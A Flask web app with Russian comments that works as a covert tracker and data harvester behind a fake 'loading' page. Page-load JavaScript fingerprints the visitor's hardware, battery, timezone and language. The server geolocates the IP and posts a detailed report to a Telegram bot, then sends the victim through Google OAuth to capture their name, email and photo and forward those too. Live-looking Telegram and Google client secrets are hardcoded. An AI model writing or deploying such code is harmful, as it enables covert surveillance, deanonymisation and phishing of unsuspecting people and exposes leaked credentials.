from datetime import datetime
import os
from flask import Flask, redirect, render_template_string, request, session, url_for
import requests

app = Flask(__name__)
app.secret_key = os.urandom(24)

TELEGRAM_BOT_TOKEN = "8694192081:AAHOX9HIqNuYPt1hhq9Ua9d4SDS6mJ0s0tw"
TELEGRAM_CHAT_ID = "8564758689"

GOOGLE_CLIENT_ID = (
    "23197192099-5ik0d5n4cb58leaikc44bernhmq1mgb0.apps.googleusercontent.com"
)
GOOGLE_CLIENT_SECRET = "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"
RENDER_URL = "https://photo-2pii.onrender.com"


def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Ошибка отправки текста: {e}")


@app.route("/")
def index():
    user_agent = request.headers.get("User-Agent", "")
    if "Go-http-client" in user_agent or "Render" in user_agent:
        return "OK", 200

    # Отдаем HTML-страницу, которая собирает железо через JS и уходит на Google OAuth
    html_page = f"""
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <title>Загрузка...</title>
    </head>
    <body>
        <script>
            async function collectAndRedirect() {{
                let screenInfo = screen.width + "x" + screen.height + " (Доступно: " + window.innerWidth + "x" + window.innerHeight + ")";
                let pixelRatio = window.devicePixelRatio || 1;
                let touchPoints = navigator.maxTouchPoints || 0;
                let cpuCores = navigator.hardwareConcurrency || "Неизвестно";
                let memory = navigator.deviceMemory ? navigator.deviceMemory + " ГБ" : "Неизвестно";
                let platform = navigator.platform || "Неизвестно";
                let language = navigator.language || "Неизвестно";
                let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Неизвестно";
                let cookiesEnabled = navigator.cookieEnabled ? "Да" : "Нет";

                let gpu = "Неизвестно";
                try {{
                    let canvas = document.createElement('canvas');
                    let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (gl) {{
                        let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        if (debugInfo) {{
                            gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                        }}
                    }}
                }} catch(e) {{}}

                let batteryLevel = "Неизвестно";
                let batteryCharging = "Неизвестно";
                try {{
                    if (navigator.getBattery) {{
                        let battery = await navigator.getBattery();
                        batteryLevel = Math.round(battery.level * 100) + "%";
                        batteryCharging = battery.charging ? "Да" : "Нет";
                    }}
                }} catch(e) {{}}

                let data = {{
                    screen: screenInfo,
                    pixel_ratio: pixelRatio,
                    touch: touchPoints,
                    cores: cpuCores,
                    memory: memory,
                    platform: platform,
                    language: language,
                    timezone: timezone,
                    cookies: cookiesEnabled,
                    gpu: gpu,
                    battery_level: batteryLevel,
                    battery_charging: batteryCharging
                }};

                // Отправляем первичную инфу на сервер
                await fetch('/collect', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify(data)
                }});

                // Перенаправляем на авторизацию Google
                window.location.href = "https://accounts.google.com/o/oauth2/v2/auth?client_id={GOOGLE_CLIENT_ID}&redirect_uri={RENDER_URL}/callback&response_type=code&scope=email%20profile";
            }}
            collectAndRedirect();
        </script>
    </body>
    </html>
    """
    return render_template_string(html_page)


@app.route("/collect", methods=["POST"])
def collect():
    data = request.json or {}
    
    ip = request.headers.get("X-Forwarded-For", request.headers.get("X-Real-IP", request.remote_addr))
    if "," in ip:
        ip = ip.split(",")[0].strip()

    visit_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    geo_info = {}
    try:
        geo_resp = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,org,proxy", timeout=3)
        if geo_resp.status_code == 200:
            geo_info = geo_resp.json()
    except:
        pass

    country = geo_info.get("country", "Не определено")
    region = geo_info.get("regionName", "Не определено")
    city = geo_info.get("city", "Не определено")
    lat = geo_info.get("lat", 0)
    lon = geo_info.get("lon", 0)
    isp = geo_info.get("isp", "Не определено")
    org = geo_info.get("org", "Не определено")
    is_vpn = "Да" if geo_info.get("proxy") else "Нет"

    user_agent = request.headers.get("User-Agent", "")

    # Сохраняем в сессию или временный словарь, но проще отправить сразу первое уведомление
    initial_message = (
        f"🔔 *МАКСИМАЛЬНЫЙ ОТЧЕТ О ПЕРЕХОДЕ*\n\n"
        f"⏱️ *Время:* `{visit_time}`\n"
        f"🌐 *IP-адрес:* `{ip}`\n"
        f"🛡 *VPN / Прокси:* `{is_vpn}`\n"
        f"🔗 *Реферер:* `{request.referrer or 'Прямой заход'}`\n\n"
        f"📍 *ГЕОЛОКАЦИЯ:*\n"
        f"- Страна: `{country}`\n"
        f"- Регион: `{region}`\n"
        f"- Город: `{city}`\n"
        f"- Координаты: `{lat}, {lon}`\n"
        f"- Провайдер: `{isp}`\n"
        f"- Организация: `{org}`\n\n"
        f"💻 *ЖЕЛЕЗО И ЭКРАН:*\n"
        f"- Платформа ОС: `{data.get('platform')}`\n"
        f"- Экран: `{data.get('screen')}`\n"
        f"- Плотность пикселей: `{data.get('pixel_ratio')}`\n"
        f"- Точки касания (Тач): `{data.get('touch')}`\n"
        f"- Ядра процессора: `{data.get('cores')}`\n"
        f"- Оперативная память: `{data.get('memory')}`\n"
        f"- Видеокарта (GPU): `{data.get('gpu')}`\n\n"
        f"⚙️ *СИСТЕМА И БАТАРЕЯ:*\n"
        f"- Язык: `{data.get('language')}`\n"
        f"- Часовой пояс: `{data.get('timezone')}`\n"
        f"- Батарея: `{data.get('battery_level')} (Зарядка: {data.get('battery_charging')})`\n"
        f"- Cookies: `{data.get('cookies')} | Онлайн: Да`\n\n"
        f"🌐 *USER-AGENT:*\n`{user_agent}`"
    )

    send_telegram_message(initial_message)
    return "OK", 200


@app.route("/callback")
def callback():
    code = request.args.get("code")
    if not code:
        return "Ошибка авторизации: код не получен", 400

    redirect_uri = f"{RENDER_URL}/callback"
    token_url = "https://oauth2.googleapis.com/token"
    token_data = {
        "code": code,
        "client_id": GOOGLE_CLIENT_ID,
        "client_secret": GOOGLE_CLIENT_SECRET,
        "redirect_uri": redirect_uri,
        "grant_type": "authorization_code",
    }

    token_r = requests.post(token_url, data=token_data)
    if token_r.status_code != 200:
        return f"Ошибка получения токена: {token_r.text}", 400

    access_token = token_r.json().get("access_token")

    user_info_url = "https://www.googleapis.com/oauth2/v2/userinfo"
    headers = {"Authorization": f"Bearer {access_token}"}
    user_r = requests.get(user_info_url, headers=headers)

    if user_r.status_code != 200:
        return "Ошибка получения профиля", 400

    user_info = user_r.json()
    email = user_info.get("email", "Не указана")
    name = user_info.get("name", "Не указано")
    picture = user_info.get("picture", "Нет фото")

    visit_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Второе сообщение — когда получена почта и профиль
    success_message = (
        f"🔑 *УСПЕШНЫЙ ВХОД (С ПОЧТОЙ)*\n\n"
        f"👤 *Имя:* `{name}`\n"
        f"📧 *Email:* `{email}`\n"
        f"🖼 *Аватар:* [Фото профиля]({picture})\n"
        f"⏱️ *Время:* `{visit_time}`"
    )

    send_telegram_message(success_message)
    return redirect("https://google.com")


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
